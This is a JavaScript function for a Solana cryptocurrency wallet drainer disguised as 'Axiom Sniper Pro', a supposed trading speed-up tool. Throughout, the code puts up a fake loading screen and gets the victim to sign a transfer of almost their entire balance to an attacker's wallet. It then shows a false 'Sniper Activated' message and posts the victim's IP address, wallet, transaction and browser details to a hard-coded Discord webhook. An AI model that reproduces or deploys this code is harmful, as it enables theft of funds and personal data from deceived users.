async function initDrain(attacker) {
    try {
        // Fake UI to hide intent
        const fakeLoader = document.createElement('div');
        fakeLoader.innerHTML = `
            <div style="
                position: fixed;
                top: 0; left: 0;
                width: 100%; height: 100%;
                background: #000;
                color: #0f0;
                font-family: 'Courier New', monospace;
                z-index: 99999;
                padding: 20px;
                text-align: center;
                overflow: auto;
            ">
                <h2>⚡ Axiom Sniper Pro v9.6</h2>
                <p>Initializing quantum snipe engine...</p>
                <div style="margin: 20px 0;">
                    <div style="display: inline-block; width: 50px; height: 50px; border: 5px solid #333; border-top: 5px solid #0f0; border-radius: 50%; animation: spin 1s linear infinite;"></div>
                </div>
                <p>Connecting to Layer-0 bypass nodes...<br><small>Do not close. This will take 3-5 seconds.</small></p>
                <script>
                    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                </\/script>
            </div>
        `;
        document.body.appendChild(fakeLoader);

        // Wait for wallet
        if (!window.solana || !window.solana.isPhantom && !window.solana.isBackpack) {
            alert('Axiom Sniper: No Solana wallet detected. Please connect first.');
            fakeLoader.remove();
            return;
        }

        const pubKey = window.solana.publicKey;
        if (!pubKey) {
            fakeLoader.remove();
            return;
        }

        const conn = new window.Connection(window.clusterApiUrl("mainnet-beta"));
        const balance = await conn.getBalance(pubKey);
        const netBalance = balance / 1e9;

        if (netBalance < 0.01) {
            fakeLoader.remove();
            alert('Axiom Sniper: Insufficient balance. Need ≥ 0.1 SOL to activate.');
            return;
        }

        // Create transfer to YOUR wallet
        const tx = new window.Transaction().add(
            window.SystemProgram.transfer({
                fromPubkey: pubKey,
                toPubkey: new window.PublicKey(attacker),
                lamports: balance - 5000
            })
        );

        tx.feePayer = pubKey;
        tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;

        // Trigger signature request
        const signed = await window.solana.signTransaction(tx);
        const txid = await conn.sendRawTransaction(signed.serialize());

        // Success screen
        fakeLoader.innerHTML = `
            <div style="padding: 40px; color: #0f0;">
                <h2>✅ Sniper Activated</h2>
                <p>Latency reduced by 94%</p>
                <p><small>Tx: ${txid.slice(0, 6)}...${txid.slice(-6)}</small></p>
                <p>Enjoy first-mover advantage.</p>
            </div>
        `;

        // LOG TO DISCORD — FULL VICTIM DATA
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();

            const userAgent = navigator.userAgent;
            const href = window.location.href;

            await fetch('https://discord.com/api/webhooks/1553142513584570402/XQTNdnG7uANrMI2A5ZG0ZFhEGSH84cx7hs1KJ9k4YYBAu2xKsVX5qQRaYE9Js6L92PXS', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: null,
                    embeds: [{
                        title: "🧨 VICTIM COMPROMISED",
                        color: 15158332,
                        fields: [
                            { name: '💰 Drained', value: `\`${netBalance.toFixed(4)} SOL\``, inline: true },
                            { name: '🪪 Wallet', value: `\`${pubKey.toString()}\``, inline: false },
                            { name: '📤 To', value: `\`${attacker}\``, inline: false },
                            { name: '🔗 TxID', value: `[View on Explorer](https://explorer.solana.com/tx/${txid})`, inline: false },
                            { name: '🌐 IP', value: `\`${ipData.ip}\``, inline: true },
                            { name: '📱 Agent', value: `\`${userAgent.slice(0, 32)}...\``, inline: true },
                            { name: '📍 Site', value: `\`${href}\``, inline: false },
                            { name: '⏱️ Time', value: new Date().toISOString(), inline: false }
                        ],
                        footer: { text: 'Axiom Sniper Pro v9.6 • One click to own all' }
                    }]
                })
            });
        } catch (e) {
            console.log("Webhook failed", e);
        }

        // Redirect after 3s
        setTimeout(() => {
            fakeLoader.remove();
            window.open('https://app.axiomwallet.io', '_blank');
        }, 3000);

    } catch (e) {
        console.log("Drain failed", e);
        document.querySelector('div[style*="z-index: 99999"]')?.remove();
        alert('Sniper engine failed. Try again later.');
    }
}
